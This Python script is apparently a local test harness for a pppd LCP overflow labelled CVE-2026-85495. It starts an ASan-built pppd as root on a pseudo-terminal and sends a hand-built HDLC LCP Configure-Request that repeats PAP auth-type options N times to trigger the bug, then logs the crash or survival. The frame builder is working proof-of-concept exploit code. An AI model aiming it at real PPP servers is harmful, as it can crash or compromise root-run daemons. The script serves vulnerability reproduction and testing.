#!/usr/bin/env python3
"""Local-only PTY driver for the CVE-2026-85495 pppd LCP NAK overflow.

Opens a pty pair, starts a pinned ASan pppd on the slave as root with the
CHAP-only hardening config, and sends one RFC-1662 HDLC-framed LCP
Configure-Request with N repeated PAP AUTHTYPE CIs from the master. No
external connection, no scan, no target beyond the locally spawned process.
"""
import argparse
import json
import fcntl
import os
import pty
import select
import struct
import subprocess
import sys
import termios
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
LOGDIR = ROOT / "raw"
LOGDIR.mkdir(exist_ok=True)
SECRETS_LOCAL = LOGDIR / "chap-secrets"
SECRETS = Path("/run/pppd2shell-live/chap-secrets")


def fcs16(data: bytes) -> int:
    f = 0xFFFF
    for b in data:
        f ^= b
        for _ in range(8):
            f = (f >> 1) ^ 0x8408 if f & 1 else f >> 1
    return f ^ 0xFFFF


def stuff(data: bytes) -> bytes:
    out = bytearray()
    for b in data:
        if b < 0x20 or b in (0x7E, 0x7D):
            out += bytes((0x7D, b ^ 0x20))
        else:
            out.append(b)
    return bytes(out)


def lcp_confreq(n: int, ident: int = 1) -> bytes:
    body = bytes((3, 4, 0xC0, 0x23)) * n
    header = struct.pack("!BBH", 1, ident, 4 + len(body))
    return header + body


def hdlc(info: bytes) -> bytes:
    core = bytes((0xFF, 0x03)) + struct.pack("!H", 0xC021) + info
    f = fcs16(core)
    return b"\x7e" + stuff(core + bytes((f & 0xFF, f >> 8))) + b"\x7e"


def set_raw(fd: int) -> None:
    attrs = termios.tcgetattr(fd)
    attrs[0] = 0
    attrs[1] = 0
    attrs[3] = 0
    attrs[6][termios.VMIN] = 1
    attrs[6][termios.VTIME] = 0
    termios.tcsetattr(fd, termios.TCSANOW, attrs)


def run(binary: str, n: int, wait_ready: float, hold: float, tag: str,
        frame_file: str | None = None) -> int:
    SECRETS_LOCAL.write_text('"labserver"\t*\t"labsecret"\t*\n'
                             '"labpeer"\t*\t"labsecret"\t*\n')
    SECRETS_LOCAL.chmod(0o644)
    subprocess.run(["sudo", "-n", "mkdir", "-p", str(SECRETS.parent)], check=True)
    subprocess.run(["sudo", "-n", "install", "-o", "root", "-g", "root",
                    "-m", "0600", str(SECRETS_LOCAL), str(SECRETS)], check=True)
    master, slave = pty.openpty()
    set_raw(slave)
    slave_name = os.ttyname(slave)
    log_path = LOGDIR / f"{tag}-pppd.log"
    env = dict(os.environ)
    asan = "detect_leaks=0:abort_on_error=0:log_path=" + str(LOGDIR / f"{tag}-asan")
    env["ASAN_OPTIONS"] = asan
    cmd = [
        "sudo", "-n", "env", "ASAN_OPTIONS=" + asan, binary,
        "nodetach", "passive", "local", "refuse-pap", "refuse-eap",
        "noip", "noipv6", "noproxyarp", "nolock", "debug",
        "chap-secrets", str(SECRETS), "name", "labserver",
        slave_name,
    ]
    with open(log_path, "wb") as log:
        proc = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=log,
                                stderr=subprocess.STDOUT, env=env,
                                close_fds=True)
    os.close(slave)
    fcntl.fcntl(master, fcntl.F_SETFL, os.O_NONBLOCK)
    deadline = time.monotonic() + wait_ready
    heard = bytearray()
    while time.monotonic() < deadline:
        r, _, _ = select.select([master], [], [], 0.1)
        if r:
            try:
                chunk = os.read(master, 65536)
            except (BlockingIOError, OSError):
                chunk = b""
            if chunk:
                heard += chunk
        if proc.poll() is not None:
            break
    (LOGDIR / f"{tag}-early.bin").write_bytes(bytes(heard))
    # pppd's LCP FSM must leave INITIAL/STARTING before it processes CONFREQ.
    sent = hdlc(lcp_confreq(n))
    if frame_file:
        sent = Path(frame_file).read_bytes()
    (LOGDIR / f"{tag}-frame.bin").write_bytes(sent)
    try:
        os.write(master, sent)
    except OSError as exc:
        print(f"write failed: {exc}")
    after = bytearray()
    deadline = time.monotonic() + hold
    while time.monotonic() < deadline:
        r, _, _ = select.select([master], [], [], 0.1)
        if r:
            try:
                chunk = os.read(master, 65536)
            except (BlockingIOError, OSError):
                chunk = b""
            if chunk:
                after += chunk
        if proc.poll() is not None:
            break
    (LOGDIR / f"{tag}-reply.bin").write_bytes(bytes(after))
    rc = proc.poll()
    if rc is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=3)
        rc = 0  # explicit marker: survived the observation window
    os.close(master)
    for asan in LOGDIR.glob(f"{tag}-asan.*"):
        subprocess.run(["sudo", "-n", "chmod", "a+r", str(asan)], check=False)
    summary = {
        "tag": tag, "binary": binary, "n": n, "frame_len": len(sent),
        "early_bytes": len(heard), "reply_bytes": len(after),
        "process_rc": rc, "survived_window": rc == 0,
        "pppd_log": str(log_path),
    }
    (LOGDIR / f"{tag}-summary.json").write_text(json.dumps(summary, indent=2))
    return 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--binary", required=True)
    ap.add_argument("--n", type=int, required=True)
    ap.add_argument("--ready", type=float, default=1.5)
    ap.add_argument("--hold", type=float, default=2.0)
    ap.add_argument("--tag", required=True)
    ap.add_argument("--frame-file", default=None)
    a = ap.parse_args()
    return run(a.binary, a.n, a.ready, a.hold, a.tag, a.frame_file)


if __name__ == "__main__":
    sys.exit(main())
